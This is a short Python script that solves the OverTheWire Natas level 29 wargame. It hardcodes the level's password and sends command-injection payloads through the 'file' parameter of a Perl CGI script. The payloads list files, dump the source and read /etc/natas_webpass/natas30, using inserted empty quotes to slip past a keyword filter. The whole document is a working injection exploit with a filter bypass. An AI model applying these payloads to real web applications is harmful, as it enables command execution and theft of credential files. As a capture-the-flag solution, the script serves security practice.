#!/usr/bin/env python3

import requests
import re

username = 'natas29'
password = 'airooCaiseiyee8he8xongien9euhe8b'

# url = 'http://%s.natas.labs.overthewire.org/index.pl?file=/etc/natas_webpass/natas30' % username
url = 'http://%s.natas.labs.overthewire.org/' % username
ls = 'index.pl?file=|ls%3b'
index = 'index.pl?file=|cat%20index.pl%3b'
webpass = 'index.pl?file=|cat%20/etc/n%22%22atas_webpass/n%22%22atas30%3b'

session = requests.Session()
# response = session.get(url + ls, auth = (username, password))

# we can see that index.pl prints out meeeeeep! if we try to use natas in the name
# response = session.get(url + index, auth = (username, password))

# we can bypass it altogether with character encoding
response = session.get(url + webpass, auth = (username, password))

# response = session.post(url, auth = (username, password))

# print(response.text)
print(re.findall('</html>\n(.*)\n', response.text)[0])